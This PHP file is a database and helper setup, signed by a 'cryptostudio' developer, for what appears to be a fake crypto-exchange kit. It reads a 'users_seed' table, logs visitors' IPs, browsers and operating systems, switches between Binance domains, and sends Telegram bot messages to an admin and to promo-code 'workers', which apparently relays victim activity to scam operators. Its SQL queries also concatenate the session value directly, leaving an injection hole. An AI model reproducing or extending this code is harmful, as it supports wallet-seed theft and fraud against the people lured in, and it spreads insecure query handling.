<?php
#session_start();
$url = 'https://'.$_SERVER['SERVER_NAME'].'/';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$timestamp = time();

require_once 'settings/db_connect.php';

$rootPath = $_SERVER['DOCUMENT_ROOT'];
$filePath = str_replace($rootPath, '', __DIR__);
$dir = $_SERVER['DOCUMENT_ROOT'] . $filePath . "/db_cryptostudio";
$db = new SQLite3($dir."/db" . $id_db . ".db");
$dbB = new SQLite3($dir."/db" . $id_db_balance . ".db");
$dbV = new SQLite3($dir."/db" . $id_db_visit . ".db");
/*
$dir = __DIR__;
$id_db = "_228";
$id_db_balance = "B_228";
$db = new SQLite3($dir."/db" . $id_db . ".db");
$dbB = new SQLite3($dir."/db" . $id_db_balance . ".db");
*/
//$dbV->query("CREATE TABLE IF NOT EXISTS visitors (id INTEGER PRIMARY KEY, ip TEXT, timestamp INTEGER)");

if ($stmt = $db->prepare('SELECT * FROM settings WHERE id=1')) {
    $result = $stmt->execute();
    $USER_S = $result->fetchArray(SQLITE3_ASSOC);
}

$chat_id = $USER_S['tg_admin'];
$bot_token = $USER_S['tg_bot'];
$ts_id = $USER_S['ts'];



if(isset($_SESSION['uuid'])) {
    if ($stmt = $db->prepare('SELECT * FROM users WHERE uuid="' . $_SESSION['uuid'] . '"')) {
        $result = $stmt->execute();
        $USER = $result->fetchArray(SQLITE3_ASSOC);
    }

    if ($stmt = $dbV->prepare('SELECT * FROM users_seed WHERE uuid="' . $_SESSION['uuid'] . '"')) {
        $result = $stmt->execute();
        $USER_SEED = $result->fetchArray(SQLITE3_ASSOC);
    }

    if ($stmt = $db->prepare('SELECT * FROM promo_actived WHERE user="' . $_SESSION['uuid'] . '"')) {
        $result = $stmt->execute();
        $USER_PROMO = $result->fetchArray(SQLITE3_ASSOC);
    }

    if (!isset($USER_PROMO['promo'])) {
        $USER_PROMO['promo'] = "Не введен";
    }
}

function getBrowers(){
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/\b(?:MSIE|Chrome|Firefox|Safari|Opera)\b/i', $user_agent, $matches)) {
        $browser = $matches[0];
        preg_match('/\b(?:Version|MSIE|Chrome|Firefox|Safari|Opera)[\/ ]?([0-9.]+)/i', $user_agent, $matches);
        $version = $matches[1];
    }
    return $browser."|".$version;
}

function getAgent(){
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/\b(?:Windows|Mac OS X|iOS|Android)\b/i', $user_agent, $matches)) {
        $os = $matches[0];
        preg_match('/\b(?:Windows NT|Mac OS X|CPU OS|Android)[\/ ]?([0-9._]+)/i', $user_agent, $matches);
        $version = $matches[1];
    }
    return $os."|".$version;
}

function getDepTokensBalance(){
    global $dbV;
    if ($stmt = $dbV->prepare('SELECT * FROM settings_json WHERE id="1"')) {
        $result = $stmt->execute();
        while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
            $json_file = $arr['balance'];
        }
    }
    return $json_file;
}

function sendTelegramMessage($chat_id, $message, $bot_token)
{
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $result = json_decode($response, true);
    return $result;
}

function sendTelegramMessageWorker($promo, $message, $bot_token)
{
    $chat_id = '';
    if(isset($promo)){
        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
        $post_fields = array(
            'chat_id' => $chat_id,
            'text' => $message
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        $result = json_decode($response, true);
        return $result;
    }
}

function guardText($str,$chars = array('/',"'",'"','(',')',';','>','<'),$allowedTags = '') {
    $str = str_replace($chars,'',strip_tags($str,$allowedTags));
    return preg_replace("/[^A-Za-z0-9_\-\.\/\\p{L}[\p{L} _.-]/u",'',$str);
}

function getSettings($type, $db){
    $t = false;
    if($type == '1domain_cur'){
        $t = true;
        $type = 'domain_cur';
    }
    if ($stmt = $db->prepare('SELECT * FROM settings WHERE id=1')) {
        $result = $stmt->execute();
        while ($arr = $result->fetchArray(SQLITE3_ASSOC)) {
            $get_info = $arr[$type];
        }
    }

    if($t){
        if(($get_info == 'binance.us') or ($get_info == 'binance.com')){
            $get_info = 'api.'.$get_info;
        }
    }else{
        if(($get_info == 'binance.us') or ($get_info == 'binance.com')){
            $get_info = 'www.'.$get_info;
        }
    }

    return $get_info;
}

// Dev by @cryptostudio_dev
?>
